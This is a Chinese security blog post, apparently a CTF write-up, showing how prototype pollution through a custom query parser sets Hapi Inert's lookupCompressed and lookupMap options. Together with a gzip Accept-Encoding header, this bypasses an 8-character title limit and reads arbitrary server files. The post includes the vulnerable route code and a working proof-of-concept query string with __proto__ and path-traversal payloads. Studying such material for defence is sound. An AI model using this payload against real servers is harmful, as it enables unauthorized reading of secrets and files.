---
title: Hapi Inert lookupMap 原型污染实现无长度限制任意文件读取
url: https://mp.weixin.qq.com/s/bJ3XBXH_NN2kT_ThRS-yGQ
source: Doonsec's feed
date: 2026-04-28
fetch_date: 2026-04-29T05:05:54.016602
---

# Hapi Inert lookupMap 原型污染实现无长度限制任意文件读取

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/SPfHPOgCrHq3d8Q1TuQSHWMbOwzwHBM43r9oia4kUkeYDwOWpWcJDibZTFGwkBz45Y1FFrk79Qmu1PwFrW6zvqdlCeuSXVCpicUdT1EjGVw64I/0?wx_fmt=jpeg)

# Hapi Inert lookupMap 原型污染实现无长度限制任意文件读取

原创

YMsora
YMsora

YMs0ra的安全漫路

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

特定情景

不多说，上源码，最近很多时候都没有更新博客了，

在憋坨大的

我先把源码片段给出

```
{  path: '/note/{title}', method: 'GET',    handler: async (req, h) => {    try {      const title = validateTitle(req.params.title);      const filepath = file(title);      await fs.access(filepath);      return h        .file(filepath, { confine: false, filename: title })        .type('application/json');    } catch (err) {      const isTitleErr = err.message.startsWith('Title');      return h.response({ error: isTitleErr ? err.message : 'Note not found' }).code(isTitleErr ? 400 : 404);    }  }}]);
```

这里传入title参数。然后h.file进行读取，我们要明白一个先觉条件，

就是file这个方法是挂载在插件inert上的，我们去找title的逻辑

const title = validateTitle(req.params.title);

并且

```
const validateTitle = t => {  if (!t)    throw new Error('Title required');  if (typeof t !== 'string')    throw new Error('Title must be a string');  if (t.length > 8)    throw new Error('Title too long (max 8 chars)');  return t;};
```

这里的title不能大于8length

这里的title是可以路径穿越的，但是因为长度的限制，只能穿../../se就停止

但是inert所成的file执行的时候会默认读以下属性

options.lookupCompressed
options.lookupMap
options.etagMethod

当然原本是没有的，但是我们可以看到arg的处理

```
function parseQuery(qs = '') {  const out = {};  for (const pair of qs.split('&')) {    if (!pair) continue;    let [k, v = ''] = pair.split('=');    k = decodeURIComponent(k.replace(/\+/g, ' '));    v = decodeURIComponent(v.replace(/\+/g, ' '));    const parts = k.split(/\[|\]/).filter(Boolean);    let cur = out;    for (let i = 0; i < parts.length - 1; i++) {      cur = cur[parts[i]] = cur[parts[i]] || {};    }    cur[parts.at(-1)] = v;  }  return out;}
```

这里的[][]是嵌套，并且out是{}，{}.xxx

这样就很容易打原型链污染，

当

options.lookupCompressed
options.lookupMap
options.etagMethod

被正确配置的时候

```
Object.prototype.lookupCompressed =true;Object.prototype.lookupMap = { gzip: "crets/super_secret_flag.txt"};
```

这时候当请求头带

Accept-Encoding: gzip

就会去自动拼接上面的路径，自己去找服务端的文件

这样也就绕过了title的长度限制，实现了任意文件读取

单附个POC：

```
..%2f..%2f..?__proto__[lookupCompressed]=1&__proto__[lookupMap][gzip]=secrets/super_secret_flag.txt&__proto__[etagMethod]=false
```

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/SPfHPOgCrHqnEGA5UdIaMIgRXzPnnCSh042ULM5KKfT02L44y1rmHfdXTK9kwOjfmrdQtueTpakrQ79Vwp4xdABk3GewsqGV8sdJLb8GKps/0?wx_fmt=png)

YMs0ra的安全漫路

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/SPfHPOgCrHqnEGA5UdIaMIgRXzPnnCSh042ULM5KKfT02L44y1rmHfdXTK9kwOjfmrdQtueTpakrQ79Vwp4xdABk3GewsqGV8sdJLb8GKps/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过